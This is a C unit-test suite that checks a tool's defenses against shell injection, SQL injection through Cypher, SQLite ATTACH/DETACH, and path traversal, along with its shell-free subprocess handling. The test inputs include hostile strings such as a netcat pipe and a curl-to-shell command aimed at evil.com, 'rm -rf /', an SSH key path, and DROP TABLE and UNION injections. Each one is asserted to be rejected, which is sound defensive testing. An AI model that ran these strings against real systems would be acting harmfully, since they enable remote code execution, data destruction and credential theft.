/*
 * test_security.c — Tests for security defenses.
 *
 * Verifies that the actual security mechanisms work end-to-end:
 *   - Shell injection prevention (cbm_validate_shell_arg)
 *   - SQLite authorizer (ATTACH/DETACH blocked)
 *   - Path containment (realpath prevents directory traversal)
 */
#include "test_framework.h"
#include "test_helpers.h"
#include <store/store.h>
#include <cypher/cypher.h>
#include "../src/foundation/str_util.h"
#include "../src/foundation/compat_fs.h"
#include "../src/foundation/platform.h"
#include "../src/foundation/subprocess.h"

#include <string.h>
#include <sys/stat.h>
#ifndef _WIN32
#include <unistd.h>
#endif

/* ══════════════════════════════════════════════════════════════════
 *  SHELL INJECTION PREVENTION
 * ══════════════════════════════════════════════════════════════════ */

TEST(shell_rejects_single_quote) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo'bar"));
    PASS();
}

TEST(shell_rejects_dollar_subst) {
    ASSERT_FALSE(cbm_validate_shell_arg("$(whoami)"));
    PASS();
}

TEST(shell_rejects_backtick) {
    ASSERT_FALSE(cbm_validate_shell_arg("`id`"));
    PASS();
}

TEST(shell_rejects_semicolon) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo;rm -rf /"));
    PASS();
}

TEST(shell_rejects_pipe) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo|nc evil.com 4444"));
    PASS();
}

TEST(shell_rejects_ampersand) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo&background"));
    PASS();
}

TEST(shell_rejects_backslash) {
#ifdef _WIN32
    /* Backslash is allowed on Windows (path separator) */
    ASSERT_TRUE(cbm_validate_shell_arg("foo\\bar"));
#else
    ASSERT_FALSE(cbm_validate_shell_arg("foo\\bar"));
#endif
    PASS();
}

TEST(shell_rejects_newline) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo\nbar"));
    PASS();
}

TEST(shell_rejects_carriage_return) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo\rbar"));
    PASS();
}

TEST(shell_rejects_null) {
    ASSERT_FALSE(cbm_validate_shell_arg(NULL));
    PASS();
}

TEST(shell_rejects_double_quote) {
    /* On Windows, the search code path wraps args in cmd.exe-level
     * "powershell -Command \"...'%s'...\"". A " in the input would close
     * the cmd.exe outer quote. Block unconditionally. */
    ASSERT_FALSE(cbm_validate_shell_arg("foo\"bar"));
    PASS();
}

TEST(shell_rejects_redirect_out) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo>out.txt"));
    PASS();
}

TEST(shell_rejects_redirect_in) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo<in.txt"));
    PASS();
}

TEST(shell_accepts_clean_path) {
    ASSERT_TRUE(cbm_validate_shell_arg("/home/user/.local/bin/code-cortex-mcp"));
    PASS();
}

TEST(shell_accepts_spaces) {
    ASSERT_TRUE(cbm_validate_shell_arg("/Users/John Doe/Documents"));
    PASS();
}

TEST(shell_accepts_dots_dashes) {
    ASSERT_TRUE(cbm_validate_shell_arg("file-name.tar.gz"));
    PASS();
}

TEST(shell_accepts_empty) {
    ASSERT_TRUE(cbm_validate_shell_arg(""));
    PASS();
}

/* Combined attack vectors */
TEST(shell_rejects_quote_escape_attack) {
    /* Attacker tries: ' ; rm -rf / ; echo ' */
    ASSERT_FALSE(cbm_validate_shell_arg("' ; rm -rf / ; echo '"));
    PASS();
}

TEST(shell_rejects_command_substitution) {
    ASSERT_FALSE(cbm_validate_shell_arg("$(curl http://evil.com/shell.sh | sh)"));
    PASS();
}

TEST(shell_rejects_env_var_expansion) {
    ASSERT_FALSE(cbm_validate_shell_arg("${HOME}/.ssh/id_rsa"));
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SQLITE AUTHORIZER (ATTACH/DETACH BLOCKED)
 * ══════════════════════════════════════════════════════════════════ */

TEST(sqlite_blocks_attach_via_cypher) {
    /* The Cypher engine translates queries to SQL. Even if someone crafts
     * a Cypher query that somehow produces ATTACH, the SQLite authorizer
     * should deny it. We test by using raw SQL through the store. */
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    /* Try ATTACH via Cypher — should fail at parse or authorizer level */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r);
    /* Valid query works */
    ASSERT_EQ(rc, 0);
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_blocks_attach_direct) {
    /* Directly test that the store's SQLite authorizer blocks ATTACH.
     * cbm_store_exec_raw() would be ideal but the store is opaque.
     * Instead, try a Cypher query that would generate ATTACH-like SQL.
     * The Cypher parser rejects non-Cypher syntax, so ATTACH never reaches
     * SQLite — this is defense in depth (parser + authorizer). */
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    /* Cypher parser should reject this as invalid syntax */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "ATTACH DATABASE '/tmp/evil.db' AS evil", "test", 0, &r);
    ASSERT_NEQ(rc, 0); /* Must fail — either parse error or authorizer deny */
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_blocks_detach_direct) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "DETACH DATABASE evil", "test", 0, &r);
    ASSERT_NEQ(rc, 0); /* Must fail */
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_allows_normal_queries) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_node_t n = {.project = "test",
                    .label = "Function",
                    .name = "hello",
                    .qualified_name = "test.hello",
                    .file_path = "main.c",
                    .start_line = 1,
                    .end_line = 5};
    cbm_store_upsert_node(s, &n);

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (f:Function) WHERE f.name = \"hello\" RETURN f", "test",
                                0, &r);
    ASSERT_EQ(rc, 0);
    ASSERT_EQ(r.row_count, 1);

    cbm_cypher_result_free(&r);
    cbm_store_close(s);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SQL INJECTION VIA CYPHER
 * ══════════════════════════════════════════════════════════════════ */

TEST(cypher_rejects_sql_injection_in_string) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    /* Attempt SQL injection through a WHERE clause string value */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(
        s, "MATCH (n) WHERE n.name = \"x\\\"; DROP TABLE nodes; --\" RETURN n", "test", 0, &r);
    /* Must either fail or return 0 rows — must NOT drop the table */
    if (rc == 0) {
        /* Query ran but should find nothing — verify nodes table still exists */
        cbm_cypher_result_free(&r);
        cbm_cypher_result_t r2 = {0};
        int rc2 = cbm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r2);
        ASSERT_EQ(rc2, 0); /* Table must still exist */
        cbm_cypher_result_free(&r2);
    } else {
        cbm_cypher_result_free(&r);
    }

    cbm_store_close(s);
    PASS();
}

TEST(cypher_rejects_union_injection) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (n) RETURN n UNION SELECT sql FROM sqlite_master", "test",
                                0, &r);
    /* Cypher parser should reject UNION — it's not valid Cypher */
    ASSERT_NEQ(rc, 0);
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  PATH CONTAINMENT (POSIX only — realpath() not available on Windows)
 * ══════════════════════════════════════════════════════════════════ */

#ifndef _WIN32

TEST(path_traversal_blocked) {
    /* The get_code_snippet handler uses realpath() to verify that the
     * resolved file path starts with the project root. We test this
     * by calling the MCP handler with a traversal path. Since we can't
     * easily call the MCP handler in a unit test, we verify the
     * containment logic directly. */
    char real_root[4096];
    char real_file[4096];

    /* /tmp is a real directory — create a temporary "project root" */
    const char *root = "/tmp/cbm_security_test_root";
    mkdir(root, 0755);

    if (realpath(root, real_root)) {
        /* Traversal attempt: ../../../etc/passwd relative to root */
        char traversal[512];
        snprintf(traversal, sizeof(traversal), "%s/../../../etc/passwd", root);

        if (realpath(traversal, real_file)) {
            /* Verify the resolved path does NOT start with root */
            size_t root_len = strlen(real_root);
            int contained = (strncmp(real_file, real_root, root_len) == 0 &&
                             (real_file[root_len] == '/' || real_file[root_len] == '\0'));
            ASSERT_FALSE(contained);
        }
        /* If realpath fails, the file doesn't exist — also safe */
    }

    rmdir(root);
    PASS();
}

TEST(path_within_root_allowed) {
    char real_root[4096];
    char real_file[4096];

    const char *root = "/tmp";
    if (realpath(root, real_root) && realpath("/tmp", real_file)) {
        size_t root_len = strlen(real_root);
        int contained = (strncmp(real_file, real_root, root_len) == 0 &&
                         (real_file[root_len] == '/' || real_file[root_len] == '\0'));
        ASSERT_TRUE(contained);
    }
    PASS();
}

#endif /* _WIN32 — path containment */

/* ══════════════════════════════════════════════════════════════════
 *  SHELL-FREE SUBPROCESS EXECUTION (cbm_exec_no_shell)
 *
 *  Replaces system() with fork()+execvp() to eliminate shell
 *  interpretation. Shell metacharacters in arguments are passed
 *  literally, not interpreted.
 * ══════════════════════════════════════════════════════════════════ */

#ifndef _WIN32

TEST(exec_no_shell_true_returns_zero) {
    /* "true" command always exits 0 */
    const char *argv[] = {"true", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_false_returns_nonzero) {
    /* "false" command always exits 1 */
    const char *argv[] = {"false", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_NEQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_echo_with_metacharacters) {
    /* Shell metacharacters must be passed literally, not interpreted.
     * If shell interpretation occurred, $(whoami) would be expanded. */
    const char *argv[] = {"echo", "$(whoami)", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 0); /* echo succeeds — prints literal "$(whoami)" */
    PASS();
}

TEST(exec_no_shell_nonexistent_command) {
    const char *argv[] = {"cbm_nonexistent_binary_12345", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_NEQ(rc, 0); /* must fail — binary doesn't exist */
    PASS();
}

TEST(exec_no_shell_null_argv_returns_error) {
    int rc = cbm_exec_no_shell(NULL);
    ASSERT_NEQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_captures_exit_code) {
    /* sh -c "exit 42" should return 42 */
    const char *argv[] = {"sh", "-c", "exit 42", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 42);
    PASS();
}

TEST(subprocess_total_timeout_ignores_continuous_progress) {
    char log_path[256];
    snprintf(log_path, sizeof(log_path), "/tmp/cbm-subprocess-timeout-%d.log", (int)getpid());
    const char *argv[] = {"/bin/sh", "-c", "while :; do echo tick; sleep 0.05; done", NULL};
    cbm_proc_opts_t opts = {0};
    opts.bin = argv[0];
    opts.argv = argv;
    opts.log_file = log_path;
    opts.quiet_timeout_ms = 2000;
    opts.total_timeout_ms = 250;
    opts.delete_log_on_exit = true;

    uint64_t started = cbm_now_ms();
    cbm_proc_result_t result;
    ASSERT_EQ(cbm_subprocess_run(&opts, &result), 0);
    uint64_t elapsed = cbm_now_ms() - started;
    ASSERT_EQ(result.outcome, CBM_PROC_HANG);
    ASSERT_TRUE(elapsed < 5000);
    PASS();
}

/* The reap loop sleeps between waitpid probes, doubling from 1ms up to a cap.
 * With the fixed 100ms cap a child that exited at 150ms was only noticed at
 * 227ms (cumulative sleeps 1+2+4+...+100), and since every MCP tool call ran in
 * such a child the client saw each call quantized to ~39/145/250/461ms steps.
 * poll_cap_ms lets short-lived children be reaped within milliseconds of their
 * exit. The child here sleeps 150ms; the old cadence cannot return before
 * ~227ms, so an elapsed time under that bound proves the cap is honoured.
 *
 * Reported as the MINIMUM of several runs. Scheduling noise on a loaded runner
 * only ever inflates the measurement, so a single sample sitting 65ms from the
 * threshold is a coin flip in CI (it flaked on macOS). The minimum converges on
 * the real cost, and stays just as discriminating: under the old cadence EVERY
 * sample would be >= ~227ms, so the minimum would be too. */
TEST(subprocess_poll_cap_reaps_short_lived_child_promptly) {
    enum { POLL_CAP_SAMPLES = 5, CHILD_SLEEP_MS = 150, OLD_CADENCE_FLOOR_MS = 215 };
    const char *argv[] = {"/bin/sh", "-c", "sleep 0.15", NULL};
    cbm_proc_opts_t opts = {0};
    opts.bin = argv[0];
    opts.argv = argv;
    opts.poll_cap_ms = 2;
    opts.total_timeout_ms = 5000;

    uint64_t best = UINT64_MAX;
    for (int i = 0; i < POLL_CAP_SAMPLES; i++) {
        cbm_proc_result_t result;
        uint64_t t0 = cbm_now_ms();
        int rc = cbm_subprocess_run(&opts, &result);
        uint64_t elapsed = cbm_now_ms() - t0;
        ASSERT_EQ(rc, 0);
        ASSERT_EQ(result.outcome, CBM_PROC_CLEAN);
        /* Never faster than the child itself — a sample below this would mean
         * the child was not actually waited for. */
        ASSERT_TRUE(elapsed >= CHILD_SLEEP_MS);
        if (elapsed < best) {
            best = elapsed;
        }
    }
    ASSERT_TRUE(best < OLD_CADENCE_FLOOR_MS);
    PASS();
}

#ifdef CBM_ENABLE_TEST_SEAMS
/* The kernel refusing a spawn with EAGAIN means "not right now", not "never" —
 * a momentarily full process table on a busy machine. We used to treat it as a
 * permanent failure, so a git probe or LSP server refused to start for a reason
 * the user could neither see nor act on, and spawns failed on loaded CI runners
 * with the contract intact.
 *
 * These pin the retry itself rather than the constant. Injecting refusals is
 * deterministic, so this proves the loop retries on EVERY machine instead of
 * only on one that happens to be starved. The whole seam (and both tests) is
 * compiled out unless CBM_ENABLE_TEST_SEAMS is defined, so production carries
 * no always-false branch. */
static int subprocess_spawn_exit_zero(cbm_proc_result_t *out) {
    const char *argv[] = {"/bin/sh", "-c", "exit 0", NULL};
    cbm_proc_opts_t opts = {0};
    opts.bin = argv[0];
    opts.argv = argv;
    return cbm_subprocess_run(&opts, out);
}

TEST(subprocess_retries_transient_spawn_refusal) {
    /* Fewer refusals than the budget: the spawn must still succeed. */
    cbm_proc_result_t result;
    cbm_subprocess_force_spawn_eagain_for_testing(3);
    int rc = subprocess_spawn_exit_zero(&result);
    int pending = cbm_subprocess_pending_spawn_eagain_for_testing();
    cbm_subprocess_force_spawn_eagain_for_testing(0); /* never leak into later tests */
    ASSERT_EQ(rc, 0);
    ASSERT_EQ(pending, 0);
    ASSERT_EQ(result.outcome, CBM_PROC_CLEAN);
    ASSERT_EQ(result.exit_code, 0);
    PASS();
}

TEST(subprocess_gives_up_after_the_retry_budget) {
    /* More refusals than the budget: it must fail rather than retry forever.
     * A machine still refusing after ~0.6s is genuinely out of capacity, and
     * failing fast beats hanging. */
    cbm_proc_result_t result;
    cbm_subprocess_force_spawn_eagain_for_testing(50);
    int rc = subprocess_spawn_exit_zero(&result);
    bool refused = result.outcome == CBM_PROC_SPAWN_FAILED;
    cbm_subprocess_force_spawn_eagain_for_testing(0); /* never leak into later tests */
    ASSERT_EQ(rc, -1);
    ASSERT_TRUE(refused);
    PASS();
}
TEST(subprocess_spawn_retry_respects_the_caller_deadline) {
    /* The retry ladder runs BEFORE the child exists. If it ignores the caller's
     * total budget it sits outside every deadline they set — cbm_index_spawn_worker
     * passes the REMAINING wall-clock budget, so a full ladder could start a
     * worker after the deadline had already passed, or return ~0.6s late (~5s
     * under a sanitizer). With a budget far smaller than the ladder, the call
     * must give up on the budget, not run the ladder to its end. */
    const char *argv[] = {"/bin/sh", "-c", "exit 0", NULL};
    cbm_proc_opts_t opts = {0};
    opts.bin = argv[0];
    opts.argv = argv;
    opts.total_timeout_ms = 25;

    cbm_proc_result_t result;
    cbm_subprocess_force_spawn_eagain_for_testing(50); /* far more than the budget allows */
    uint64_t t0 = cbm_now_ms();
    int rc = cbm_subprocess_run(&opts, &result);
    uint64_t elapsed = cbm_now_ms() - t0;
    bool refused = result.outcome == CBM_PROC_SPAWN_FAILED;
    cbm_subprocess_force_spawn_eagain_for_testing(0); /* never leak into later tests */

    ASSERT_EQ(rc, -1);
    ASSERT_TRUE(refused);
    /* The unbounded ladder is ~630ms (~5.1s sanitized). Anything at or above the
     * un-sanitized ladder means the budget was ignored; the bound is generous so
     * a loaded machine cannot make this flaky. */
    ASSERT_TRUE(elapsed < 600);
    PASS();
}
#endif /* CBM_ENABLE_TEST_SEAMS */

#endif /* _WIN32 */

/* ══════════════════════════════════════════════════════════════════
 *  SUITE
 * ══════════════════════════════════════════════════════════════════ */

SUITE(security) {
    /* Shell injection prevention */
    RUN_TEST(shell_rejects_single_quote);
    RUN_TEST(shell_rejects_dollar_subst);
    RUN_TEST(shell_rejects_backtick);
    RUN_TEST(shell_rejects_semicolon);
    RUN_TEST(shell_rejects_pipe);
    RUN_TEST(shell_rejects_ampersand);
    RUN_TEST(shell_rejects_backslash);
    RUN_TEST(shell_rejects_newline);
    RUN_TEST(shell_rejects_carriage_return);
    RUN_TEST(shell_rejects_null);
    RUN_TEST(shell_rejects_double_quote);
    RUN_TEST(shell_rejects_redirect_out);
    RUN_TEST(shell_rejects_redirect_in);
    RUN_TEST(shell_accepts_clean_path);
    RUN_TEST(shell_accepts_spaces);
    RUN_TEST(shell_accepts_dots_dashes);
    RUN_TEST(shell_accepts_empty);
    RUN_TEST(shell_rejects_quote_escape_attack);
    RUN_TEST(shell_rejects_command_substitution);
    RUN_TEST(shell_rejects_env_var_expansion);

    /* SQLite authorizer */
    RUN_TEST(sqlite_blocks_attach_via_cypher);
    RUN_TEST(sqlite_blocks_attach_direct);
    RUN_TEST(sqlite_blocks_detach_direct);
    RUN_TEST(sqlite_allows_normal_queries);

    /* SQL injection via Cypher */
    RUN_TEST(cypher_rejects_sql_injection_in_string);
    RUN_TEST(cypher_rejects_union_injection);

    /* Path containment (POSIX only) */
#ifndef _WIN32
    RUN_TEST(path_traversal_blocked);
    RUN_TEST(path_within_root_allowed);
#endif

#ifndef _WIN32
    /* Shell-free subprocess execution */
    RUN_TEST(exec_no_shell_true_returns_zero);
    RUN_TEST(exec_no_shell_false_returns_nonzero);
    RUN_TEST(exec_no_shell_echo_with_metacharacters);
    RUN_TEST(exec_no_shell_nonexistent_command);
    RUN_TEST(exec_no_shell_null_argv_returns_error);
    RUN_TEST(exec_no_shell_captures_exit_code);
    RUN_TEST(subprocess_total_timeout_ignores_continuous_progress);
    RUN_TEST(subprocess_poll_cap_reaps_short_lived_child_promptly);
#ifdef CBM_ENABLE_TEST_SEAMS
    /* Transient spawn-refusal retry (test-seam builds only) */
    RUN_TEST(subprocess_retries_transient_spawn_refusal);
    RUN_TEST(subprocess_gives_up_after_the_retry_budget);
    RUN_TEST(subprocess_spawn_retry_respects_the_caller_deadline);
#endif
#endif
}
